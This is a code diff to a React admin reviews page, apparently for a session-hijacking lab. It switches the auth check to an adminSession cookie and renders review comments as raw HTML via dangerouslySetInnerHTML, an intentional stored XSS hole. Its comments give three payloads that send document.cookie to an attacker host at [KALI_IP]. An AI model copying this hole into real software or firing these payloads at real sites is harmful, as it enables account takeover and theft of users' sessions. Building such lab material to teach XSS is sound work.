@@ -20,13 +20,19 @@ export default function AdminReviews() {
   const alertShown = useRef({});
   const reloadInitiated = useRef(false);
 
-  // Client-side auth guard
+  // Client-side auth guard - Check adminSession cookie for session hijacking demo
   useEffect(() => {
-    const isAuthed = typeof window !== 'undefined' && localStorage.getItem('isAuthenticated') === 'true';
-    if (!isAuthed) {
+    if (typeof window === 'undefined') return;
+    
+    // Check for adminSession cookie (vulnerable to XSS theft)
+    const cookies = document.cookie.split(';').map(c => c.trim());
+    const sessionCookie = cookies.find(c => c.startsWith('adminSession='));
+    
+    if (!sessionCookie) {
       router.replace('/login');
       return;
     }
+    
     fetchAllReviews();
   }, []);
 
@@ -301,9 +307,16 @@ export default function AdminReviews() {
 
                     <div className="rounded border border-gray-200 bg-gray-50 p-3">
                       <p className="text-xs font-medium text-gray-500 mb-1">Comment Preview:</p>
-                      <div className="prose max-w-none text-sm text-gray-800 whitespace-pre-wrap">
-                        {review.comment}
-                      </div>
+                      {/* ⚠️ VULNERABLE: Stored XSS - Review comments are rendered as raw HTML */}
+                      {/* Modern browsers block inline <script> tags, so use event handlers instead */}
+                      {/* Working payload examples: */}
+                      {/* <img src=x onerror="new Image().src='http://[KALI_IP]/log?c='+document.cookie"> */}
+                      {/* <svg onload="new Image().src='http://[KALI_IP]/log?c='+document.cookie"> */}
+                      {/* <iframe src="javascript:new Image().src='http://[KALI_IP]/log?c='+document.cookie"></iframe> */}
+                      <div 
+                        className="prose max-w-none text-sm text-gray-800 whitespace-pre-wrap"
+                        dangerouslySetInnerHTML={{ __html: review.comment }}
+                      />
                     </div>
 
                     <p className="mt-2 text-xs text-gray-400">
